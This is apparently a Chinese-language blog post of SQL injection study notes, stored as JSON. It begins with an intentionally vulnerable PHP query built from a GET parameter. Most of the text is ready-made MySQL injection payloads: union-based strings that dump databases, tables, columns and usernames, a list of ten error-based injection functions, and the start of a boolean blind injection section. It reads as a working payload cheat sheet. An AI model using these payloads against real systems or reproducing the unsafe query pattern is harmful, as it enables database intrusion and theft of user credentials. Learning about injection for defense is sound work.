{"title":"sql注入笔记整理","slug":"2019-03-07-sql注入笔记整理","date":"2019-03-06T16:00:00.000Z","updated":"2019-03-07T15:36:05.014Z","comments":true,"excerpt":"","content":"<blockquote>\n<p>sql注入学习中的整理笔记</p>\n</blockquote>\n<h3 id=\"一段存在sql注入漏洞的代码\"><a href=\"#一段存在sql注入漏洞的代码\" class=\"headerlink\" title=\"一段存在sql注入漏洞的代码\"></a>一段存在sql注入漏洞的代码</h3><pre><code>&lt;?php\n$id = $_GET[&apos;id&apos;];\n$conn = mysqli_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;,&apos;student&apos;);\nif(!$conn){\n    exit(&apos;Connect Error!&apos;);\n}\n$sql = &quot;select * from user where id=&apos;$id&apos;&quot;;\n$result = mysqli_query($conn,$sql);\nwhile($row = mysqli_fetch_array($result)){\n    echo $row[&apos;id&apos;].&quot;&lt;br&gt;&quot;;\n    echo $row[&apos;username&apos;].&quot;&lt;br&gt;&quot;;\n    echo $row[&apos;password&apos;];\n}\n?&gt;\n</code></pre><h3 id=\"联合注入\"><a href=\"#联合注入\" class=\"headerlink\" title=\"联合注入\"></a>联合注入</h3><p>猜解列数：</p>\n<pre><code>&apos; order by 3--+\n</code></pre><p>判断出现问题的列：</p>\n<pre><code>-1&apos; union select 1,2,3--+\n</code></pre><p>爆数据库：</p>\n<pre><code>-1&apos; union select 1,group_concat(0x7e,schema_name,0x7e),3 from information_schema.schemata--+\n</code></pre><p>爆一个数据库的表:</p>\n<pre><code>-1&apos; union select 1,group_concat(0x7e,table_name,0x7e),3 from information_schema.tables where table_schema=0x73747564656E74--+\n</code></pre><p>爆一个表的列：</p>\n<pre><code>-1&apos; union select 1,group_concat(0x7e,column_name,0x7e),3 from information_schema.columns where table_schema=0x73747564656E74 and table_name=0x75736572--+\n</code></pre><p>爆数据：</p>\n<pre><code>-1&apos; union select 1,group_concat(0x7e,username,0x7e),3 from user--+\n</code></pre><h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><h4 id=\"详细报错注入\"><a href=\"#详细报错注入\" class=\"headerlink\" title=\"详细报错注入\"></a>详细报错注入</h4><p>注入公式：</p>\n<pre><code>and(select 1 from(select count(*),concat((select(select(爆破语句)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+\n</code></pre><p>爆数据库：</p>\n<pre><code>1&apos;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,schema_name,0x7e) from information_schema.schemata limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+\n</code></pre><p>爆一个数据库的表:</p>\n<pre><code>1&apos;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e) from information_schema.tables where table_name=0x75736572 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+\n</code></pre><p>爆一个表的列：</p>\n<pre><code>1&apos;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e) from information_schema.columns where table_schema=0x73747564656E74 and table_name=0x75736572 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+\n</code></pre><p>爆数据：<br>    and(select 1 from(select count(<em>),concat((select(select(select username from user)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)–+</p>\n<h4 id=\"十种报错注入\"><a href=\"#十种报错注入\" class=\"headerlink\" title=\"十种报错注入\"></a>十种报错注入</h4><pre><code>1.floor(): and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n2.extractvalue(): and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n3.updatexml(): and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n\n4.geometrycollection(): and geometrycollection((select * from(select * from(select user())a)b));\n\n5.multipoint(): and multipoint((select * from(select * from(select user())a)b));\n\n6.linestring(): and linestring((select * from(select * from(select user())a)b));\n\n7.multipolygon(): and multipolygon((select * from(select * from(select user())a)b));\n\n8.polygon(): and polygon((select * from(select * from(select user())a)b))\n\n9.multilinestring(): and multilinestring((select * from(select * from(select user())a)b));\n\n10. exp(): and exp(~(select * from(select user())a));\n</code></pre><h3 id=\"盲注\"><a href=\"#盲注\" class=\"headerlink\" title=\"盲注\"></a>盲注</h3><h4 id=\"布尔盲注\"><a href=\"#布尔盲注\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h4><p>获取当前数据库：</p>\n<pre><code>1&apos; and left(database(),2)=&apos;st&apos;--+\n</code></pre>","categories":[],"tags":[{"name":"sql注入","path":"api/tags/sql注入.json"}]}